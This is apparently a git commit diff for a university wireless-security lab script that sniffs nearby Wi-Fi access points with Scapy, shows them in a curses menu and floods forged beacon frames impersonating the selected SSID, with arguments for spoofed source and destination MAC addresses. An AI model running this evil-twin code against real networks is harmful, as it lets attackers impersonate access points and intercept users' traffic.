8dd401576bfaa652b3d9cd2f322b9613f704eb34
LapinouSexy <lapinousexy@gmail.com>
2020-03-01 14:23:02 +0100

    Improved second script, added a menu following a tutorial + minor fixes + added few arguments

--- scripts/SWI_Labo01_EvilTwin.py
+++ scripts/SWI_Labo01_EvilTwin.py
@@ -11,6 +11,7 @@
 # - https://gist.github.com/thepacketgeek/6876699
 # - https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
 # - https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
+# - https://www.youtube.com/watch?v=zwMsmBsC1GM&t=1117s
 
 import argparse
 import subprocess
@@ -22,16 +23,45 @@ from scapy.all import *
 
 apList = []
 kill = False
-line = 1
 NUMBER_OF_CHANNEL = 14
 BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"
+selectedAP = 0
 
 # Arguments
 parser = argparse.ArgumentParser(description="This script is used to detect nearby SSID and display them, and then when the user choose one of the SSID, it create a fake AP by spamming Beacon Frame advertising the same SSID")
 parser.add_argument("-i", "--interface", required=True, help="the interface to use")
 parser.add_argument("-n", "--number", default=0, type=int, help="the number of fake probe response to send")
+parser.add_argument("-s", "--source", default="BB:BB:BB:BB:BB:BB", type=str, help="the source address")
+parser.add_argument("-d", "--destination", default=BROADCAST_MAC_ADDRESS, type=str, help="the destination address")
 
 arguments = parser.parse_args()
+
+def displayAPList(stdscr, selectedAP):
+    stdscr.clear()
+
+    stdscr.addstr(0,0,"Choose a Wifi AP to begin the attack")
+    stdscr.refresh()
+
+    stdscr.addstr(2,0,"SSID          Channel         Power")
+    stdscr.refresh()
+
+    i = 4
+
+    for element in apList:
+        apName = element.info.decode()
+
+        textToDisplay = str(apList.index(element) + 1) + ") " + apName + " - CH " + str(ord(element[Dot11Elt][2].info)) + "  " + str(element.dBm_AntSignal) + " dBm"
+
+        if(apList.index(element) == selectedAP):
+            stdscr.attron(curses.color_pair(1))
+            stdscr.addstr(i, 0, textToDisplay)
+            stdscr.attroff(curses.color_pair(1))
+        else:
+            stdscr.addstr(i, 0, textToDisplay)
+        
+        i += 1
+
+    stdscr.refresh()
 
 # This function is threaded, and is used to launch 'iwconfig' in order to change the channel of the card, each second.
 def channelChange():
@@ -47,19 +77,22 @@ def channelChange():
 
         i = i % 13 + 1
 
-        #if(i == 0):
-            #i = 1
-
 # We use a nested function in order to pass argument to the sniff() callback function, source: https://gist.github.com/thepacketgeek/6876699
-def packetHandling(line, stdscr):
+def packetHandling(stdscr):
     # This function verifiy if the packet is a management frame (more specifically a BeaconFrame), and read all necessary information from the packet (SSID, channel, etc...)
     def detectSSID(packet):
         global line
-        # TODO: Limiter la pression des touches
-        c = stdscr.getch()
+        global selectedAP
 
-        if(c != -1):
-            fakeProbe(chr(c), stdscr)
+        keyPressed = stdscr.getch()
+
+        if(keyPressed == curses.KEY_UP and selectedAP > 0):
+            selectedAP -= 1
+        elif(keyPressed == curses.KEY_DOWN and selectedAP < len(apList)):
+            selectedAP += 1
+        elif(keyPressed == curses.KEY_ENTER or keyPressed in [10, 13]):
+            stdscr.clear()
+            fakeProbe(selectedAP + 1, stdscr)
 
         # We want to gather only BeaconFrame (type Management: 0 and sub type BeaconFrame: 8)
         if(packet.type == 0 and packet.subtype == 8):
@@ -69,7 +102,7 @@ def packetHandling(line, stdscr):
             apName = apName.rstrip("\x00")
 
             if(apName == ""):
-                apName = "Hidden"
+                apName = "Hidden SSID"
 
             found = False
 
@@ -82,19 +115,17 @@ def packetHandling(line, stdscr):
             if(not found):
                 apList.append(packet)
                 # Source: https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
-                stdscr.addstr(line,0,str(len(apList)) + ") " + apName + " - CH " + str(ord(packet[Dot11Elt][2].info)) + "  " + str(packet.dBm_AntSignal) + " dBm")
-                stdscr.refresh()
-                line += 1
+
+            displayAPList(stdscr, selectedAP)
     return detectSSID
 
 def fakeProbe(apNumber, stdscr):
-    global line
-
     currentPacket = apList[int(apNumber) - 1]
 
     # Killing the changing channel thread
     global kill
     kill = True
+
     # Letting the thread finishing
     time.sleep(1)
 
@@ -102,9 +133,9 @@ def fakeProbe(apNumber, stdscr):
     newChannel = ((ord(currentPacket[Dot11Elt][2].info.decode()) + 5) % 13) + 1
     
     # Crafting and sending the probe response
-    fakeBeacon= RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2="AA:AA:AA:AA:AA:AA", addr3="AA:AA:AA:AA:AA:AA") / Dot11Beacon() / Dot11Elt(ID= "SSID", info=currentPacket.info.decode()) / Dot11Elt(ID="DSset", info=chr(newChannel))
+    fakeBeacon= RadioTap() / Dot11(type=0, subtype=8, addr1=arguments.destination,addr2=arguments.source, addr3=arguments.source) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=currentPacket.info.decode()) / Dot11Elt(ID="DSset", info=chr(newChannel))
     
-    stdscr.addstr(line+1,0,"Sending fake Beacon Frame for SSID " + currentPacket.info.decode())
+    stdscr.addstr(0,0,"Sending fake Beacon Frame for SSID " + currentPacket.info.decode())
     stdscr.refresh()
 
     if(arguments.number != 0):
@@ -116,24 +147,21 @@ def fakeProbe(apNumber, stdscr):
             sendp(fakeBeacon, iface=arguments.interface, verbose=False)
 
 def main(stdscr):
-    global line
-
+    # Launching channel switch thread
     channelThread = threading.Thread(target=channelChange)
     channelThread.start()
-    stdscr.clear()
-    curses.cbreak()
 
+    # Avoid echoing the character typed and avoid delay for displaying things with curses library
     curses.noecho()
     stdscr.nodelay(1)
 
-    stdscr.addstr(line,0,"Type the number of the Wifi AP to begin the attack")
-    stdscr.refresh()
-    line += 2
+    displayAPList(stdscr, 0)
 
-    stdscr.addstr(line,0,"SSID          Channel         Power")
-    stdscr.refresh()
-    line += 1
-    
-    a = sniff(iface=arguments.interface, prn=packetHandling(line, stdscr))
+    # Set the color for selected AP in the AP list
+    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
 
+    # begin to sniff, passing every packet collected to the packetHandling function
+    a = sniff(iface=arguments.interface, prn=packetHandling(stdscr))
+
+# Avoid bug with curses library while exiting the programm abruptely
 curses.wrapper(main)
